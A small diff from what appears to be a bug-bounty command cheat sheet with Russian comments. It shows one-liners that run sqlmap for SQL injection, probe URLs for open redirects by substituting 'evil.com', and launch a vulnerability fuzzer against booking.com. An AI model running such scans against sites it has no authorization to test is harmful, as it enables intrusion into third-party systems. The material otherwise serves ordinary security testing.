@@ -29,6 +29,6 @@
 * sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
 # проверяет открытое перенаправление 
 * cat urls.txt | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep evil.com && echo $host 3[0;31mVulnerable\n ;done
-# нуклей фазер проверет все уязвимости _________________________________________
+# нуклей фазер проверет все уязвимости 
 * nf -d booking.com
 
